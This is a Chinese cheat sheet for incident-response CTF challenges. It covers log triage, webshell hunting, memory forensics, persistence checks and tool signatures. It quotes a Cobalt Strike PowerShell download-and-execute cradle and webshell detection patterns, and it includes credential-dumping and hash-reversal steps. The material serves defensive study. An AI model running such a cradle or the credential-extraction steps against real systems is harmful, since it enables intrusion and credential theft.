## 0. 拿到检材先跑这几条（万能开局）

### Linux
```bash
cat /etc/os-release; hostname; ip a
netstat -pantolu                 # 端口 + 进程 + PID（-o 计时器，-u UDP）
ps auxf                          # 进程树，看异常父进程
last; lastb                      # 登录成功 / 失败
cat /etc/passwd                  # 异常用户
crontab -l; cat /etc/crontab; ls -la /etc/cron*
history; cat ~/.bash_history     # ★ 最高频答案来源
env                              # ★ 环境变量里常藏 flag
ls -la /tmp /var/tmp /dev/shm    # ★ 落地文件重灾区
find / -name "*.log" 2>/dev/null
```

### Windows
```cmd
systeminfo
net user                          :: 注意 $ 结尾的隐藏账户
netstat -anob
tasklist /svc
schtasks /query /fo LIST /v
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
dir /ah                           :: 隐藏文件
```

## 1. 按题目问法 → 直接抄命令（核心）

### 1.1 「攻击者 IP」

```bash
# 【最常用】Web 日志按 IP 统计
cat access.log | cut -d ' ' -f 1 | sort | uniq -c | sort -nr | head -20

# 只看访问某个木马文件的 IP
cat access.log | grep shell.php | cut -d ' ' -f 1 | sort | uniq -c | sort -nr

# 过滤掉本机流量
cat access.log | grep -v "127.0.0.1"

# nginx 日志格式是 - 分隔时
cut -d- -f 1 nginx_access_2024-01-01.log | uniq -c | sort -rn | head -20

# 登录日志
grep "Accepted" /var/log/auth.log
last -i                          # 带 IP 的登录记录
```

```cmd
:: Windows：事件查看器 → 安全 → 筛选 4624（成功）/ 4625（失败）
compmgmt.msc
```
> **注意**：访问日志里会混大量**扫描器 IP**，真正的攻击者是**访问了木马文件**或**登录成功**的那个。

### 1.2 「webshell 文件名 / 连接密码」

```bash
# 找一句话木马
grep -rn "@eval(" /www/ 2>/dev/null
grep -rn 'eval($_POST' /var/www 2>/dev/null
grep -rn "assert(" /var/www 2>/dev/null

# 冰蝎默认密钥
grep -rn "e45e329feb5d925b" /var/www

# 找最近被改动的文件（按时间）
find /var/www -mtime -3 -type f -ls
```

**密码规律（重要）**：**常见是 32 位 MD5 的前 16 位**。
例：冰蝎密码 `rebeyond` → MD5 `e45e329feb5d925b...` → 取前 16 位 `e45e329feb5d925b`。
所以看到 16 位 hex 密码，**去 MD5 站反查明文**。

**常见马名（看到就先查）**：`shell.php`、`404.php`、`1.php`、`test.php`、`version2.php`、`alinotify.php`、`ReData.php`

### 1.3 「隐藏账户」

```cmd
net user                       :: $ 结尾 = 计算机账户，但也是影子账户的常见形态
```
```bash
awk -F: '$3==0 {print $1}' /etc/passwd     # UID=0 的非 root 账户 ★
```
> 真题里的隐藏账户名：`hack168$`、`hacker138`、`hack6618$`、`hacker138`

### 1.4 「管理员密码（明文）」

```bash
# 宝塔面板
bt                       # 交互式菜单，可选查看/修改面板密码

# 数据库（宝塔常见 x2_ 前缀表）
mysql -u <user> -p
show databases; use <db>; show tables;
select * from x2_user\G          # ★ \G 垂直显示，不然刷屏看不清
select * from x2_user_group\G    # id=1 通常是管理员组

# 密码哈希 → 去 MD5 站反查明文
```

### 1.5 「挖矿程序 / 矿池地址」

```bash
# Linux：先找高 CPU 进程的完整命令行
top -c
cat /proc/<PID>/cmdline | tr '\0' ' '    # 完整命令行，矿池常在这
cat /proc/<PID>/exe                       # 真实二进制路径（防改名）
ls -la /proc/<PID>/cwd

# 直接搜特征
strings <可疑文件> | grep -iE "stratum|pool|mine|xmr"
grep -rn "stratum" /tmp /var/tmp /etc 2>/dev/null
```

```cmd
:: Windows：挖矿程序常是 PyInstaller 打包的 exe ★ 高频套路
:: 1. 判断是不是 PyInstaller（图标 / strings 里有 pyinstaller 字样）
:: 2. 解包
python pyinstxtractor.py mining.exe          :: 得到 .pyc
:: 3. 反编译 pyc
python uncompyle6 mining.pyc > mining.py
:: 4. 找矿池
findstr /i "stratum pool" mining.py
```

**矿池地址格式**：`stratum+tcp://pool.minexmr.com:4444`、`wakuang.zhigongshanfang.top`

> 也别忘了 `cat /etc/crontab` —— 真题里 base64 编码的 python 一行代码就藏在 crontab 里。

### 1.6 「钓鱼邮件」

```bash
# eml 文件
grep -i "^from" mail.eml             # ★ 最后一个 from 常是发送者
grep -i "^received:" mail.eml        # 逐跳链路，可还原真实来源

# 正文 base64 解码
cat 正文.txt | base64 -d
# 附件 base64 还原
base64 -d < 附件.b64 > 钓鱼附件.zip
```

**Wireshark 一键导出传输的文件**：
```
File → Export Objects → HTTP          ★ 导出所有 HTTP 传输的文件
选中 application/octet-stream 的条目 → 看文件名和 URI
Save All → 对导出文件算 md5sum
```

**JS 混淆**：用去注释工具（如 sojson）→ 丢进浏览器 console 执行 → 得到 C2 域名

### 1.7 「持久化方式 / 隧道程序」

```bash
cat /etc/rc.d/rc.local
ls -la /etc/cron* /var/spool/cron/crontabs/     # ★ 别漏 spool
systemctl list-units --type=service
ls -la ~/.config/systemd/user/                  # ★ user 级服务
sudo find / -perm -4000 -type f 2>/dev/null     # SUID 后门
ls -la /var/tmp/proc/                           # ★ 隧道程序常伪装成 mysql 之类
```

```cmd
netsh interface portproxy show all      :: ★ 端口转发规则
schtasks /query /fo LIST /v             :: 计划任务
:: 事件 ID 7045 = 服务安装 ★
```

### 1.8 「某个时间点」

```bash
stat <文件>                       # 三个时间戳
ls -la --time-style=full-iso
find / -newermt "2024-01-01" -type f -ls     # 某时间之后被改的文件
```
```cmd
dir /tc /a                   :: 创建时间
dir /tw /a                   :: 最后写入时间
```
> 题目问「**第一次 / 最后一次**」时必须**排序**，别只看一条记录。

### 1.9 「内存里的答案」（Volatility）

```bash
# ① 先定 profile
vol.py -f mem.raw imageinfo              # vol2
vol.py -f mem.raw windows.info           # vol3

# ② 进程
vol.py -f mem.raw windows.pslist
vol.py -f mem.raw windows.pstree
vol.py -f mem.raw windows.psscan         # ★ 隐藏/未链接进程
vol.py -f mem.raw windows.cmdline        # ★ 命令行，矿池地址常在这

# ③ 网络（★ 已断开的连接也能看到）
vol.py -f mem.raw windows.netscan

# ④ 文件
vol.py -f mem.raw windows.filescan | grep -i password
vol.py -f mem.raw windows.dumpfiles --physaddr 0x3b48bc0
vol.py -f mem.raw windows.memmap --pid <PID> --dump

# ⑤ 凭据
vol.py -f mem.raw windows.hashdump       # SAM
vol.py -f mem.raw windows.lsadump        # ★ SAM 没有就试这个
vol.py -f mem.raw windows.hashdump       # 取到的 hash 去解密

# ⑥ 持久化 / 注册表
vol.py -f mem.raw windows.registry.printkey --key "ControlSet001\Control\ComputerName\ComputerName"   # 主机名
vol.py -f mem.raw windows.scheduledtasks
vol.py -f mem.raw windows.services

# ⑦ 其他
vol.py -f mem.raw windows.envars         # 环境变量
vol.py -f mem.raw cmdscan                # ★ cmd 命令历史
vol.py -f mem.raw windows.malfind        # 注入痕迹
```

**Vol2 vs Vol3 差异（别搞混）**

| | Vol2 | Vol3 |
|---|---|---|
| 定版本 | `imageinfo` → `--profile=Win7SP1x64` | `windows.info`，**不需要 profile** |
| 命令 | `pslist`、`netscan` | `windows.pslist`、`windows.netscan` |

**三个实战技巧**
1. **dump 出来的进程内存** → `strings` 过滤关键词，或**改扩展名后用 GIMP 调宽高**看图
2. **进程内存 dump 的 SHA256 与磁盘上同名文件不同**（因为内存里是展开的）—— 这是个考点
3. **Volatility 要用新版**，老版本解析新镜像会出现进程名乱码

## 2. 五类场景的标准剧本

### 剧本 A：Web 入侵（Linux）— 最常见
```
① netstat -pantolu          看监听和异常进程
② ls -laS /www/wwwlogs/     按大小排序，异常大的日志就是攻击日志
③ access.log 按 IP 统计 → 攻击者 IP
④ grep 木马名 / find -mtime  → webshell 文件和密码
⑤ history / .bash_history    → 攻击者后续操作
⑥ net user / awk UID=0       → 隐藏账户
⑦ crontab / rc.local / SUID  → 持久化
⑧ 宝塔 bt + mysql            → 管理员密码
```

### 剧本 B：Windows 挖矿 / 远控
```
① tasklist / netstat -anob   → 高 CPU 进程、异常外联
② dir /ah %TEMP%             → 隐藏木马
③ attrib -h -s <文件>        → ★ 去隐藏属性（否则算不了 hash）
④ certutil -hashfile <文件> MD5
⑤ pyinstxtractor + 反编译    → 矿池域名
⑥ 事件 7045 / 4720 / 4624    → 服务持久化 / 隐藏账户 / 首次登录时间
⑦ netsh interface portproxy show all   → 端口转发
⑧ C:\Windows\Temp\fscan.exe  → 横向工具
```
> ⚠️ **先关安全中心/杀软**（靶机说明里常提示）—— 否则第 ③ 步去属性时文件被查杀。

### 剧本 C：钓鱼邮件
```
① eml 搜 from / received      → 发送者 IP
② base64 -d 正文              → 取到解压密码
③ base64 -d 附件 → 解压       → 得到木马
④ 云沙箱 或 静态分析          → C2 IP
⑤ D盾/河马 扫 Web 目录        → webshell
⑥ ls /var/tmp/proc/           → 隧道程序配置
```

### 剧本 D：内存镜像
```
① sha256sum 存档              → 证据完整性
② windows.info / imageinfo    → 定版本
③ pslist + pstree             → 看进程和父进程
④ netscan                     → C2 / 异常外联（含已断开）
⑤ cmdline                     → 挖矿地址、可疑参数
⑥ filescan + dumpfiles        → 导出文件
⑦ hashdump / lsadump          → 凭据
⑧ printkey Run / scheduledtasks → 持久化
```

### 剧本 E：纯流量分析
```
① capinfos                    → 概览
② Wireshark 统计 → 会话        → 找异常 IP
③ 过滤 http / 导出对象         → 找上传下载的文件
④ 看最后一个响应包             → 常是被窃文件
⑤ 特征匹配（见第 3 章）        → 判工具/漏洞
⑥ 写脚本批量提取               → ★ 区分度在这
```

## 3. 特征速查（一眼认工具）

| 工具 / 类型 | 特征 |
|---|---|
| **蚁剑 AntSword** | 请求体含 `@ini_set("display_errors","0");@set_time_limit(0);`，后面跟 base64；**base64 解码要删前两位混淆字符** |
| **冰蝎 Behinder** | 默认密钥 **`e45e329feb5d925b`**；AES-128；`php://input`；请求体二进制；默认密码 `rebeyond` |
| **哥斯拉 Godzilla** | payload 前后带固定 **md5 前缀**（key 的 md5 前 16 位 + 后 16 位） |
| **Cobalt Strike** | `powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://...'))"`；命名管道 `msagent_*`；Team Server 端口 50050 |
| **frp** | `frpc.toml` / `frps.toml`；常藏 `/var/tmp/*/my.conf` |
| **PyInstaller 打包的挖矿** | exe 体积大、有特殊图标；`strings` 里有 `pyinstaller` |
| **钓鱼附件** | `Content-Transfer-Encoding: base64` |
| **Shiro 反序列化** | Cookie 里 `rememberMe=deleteMe` 或长 base64 |
| **SQL 盲注爆破** | 大量 `ascii(substr(...))` 的 GET 请求 |

## 4. 能省半小时的 10 个技巧

1. **Windows 靶机先关安全中心** —— 否则提取隐藏文件时被查杀，白忙
2. **Web 日志按大小排序**（`ls -laS`）—— 异常大的那个就是攻击日志
3. **16 位 hex 密码 = MD5 前 16 位** —— 反查明文
4. **挖矿 exe 先看是不是 PyInstaller** —— 是的话直接解包反编译，比逆向快 10 倍
5. **base64 解码注意删混淆字符** —— 蚁剑流量常见
6. **`\G` 垂直显示** —— MySQL 查宽表必用，不然看不清
7. **内存题先定 profile** —— 版本不对会乱码；Vol 用新版
8. **时间类题目必须排序** —— 问"第一次/最后一次"时
9. **答案先记来源位置** —— 答题卡制、提交次数有限，复核时要回溯
10. **原始检材先备份** —— 所有操作在副本上做

## 5. 答题规范（丢分重灾区）

| 项 | 注意 |
|---|---|
| **格式** | 严格照题目，`flag{...}` 还是裸值 |
| **MD5** | **大小写**！常要求全小写 |
| **IP** | 别漏小数点；分清内网/外网 |
| **路径** | 绝对路径，`/` vs `\` 按题目 |
| **提交次数** | 常见限制 3 次 —— **先记全再提交** |
| **多选题** | 别漏填 |

## 6. 15 分钟上手流程

```
1. file 看每个附件真身（可能有文件分离）
2. 按类型分组：流量 / 内存 / 磁盘 / 日志 / 文件
3. 每组跑「第 0 章万能开局」
4. 拿「第 1 章问法反查表」对着题目逐条找
5. 卡住了 → 翻「第 2 章剧本」看标准路线
6. 要批量提取 → 写脚本（pyshark / 正则）
7. 每条答案标注来源，最后统一核对格式再提交
```
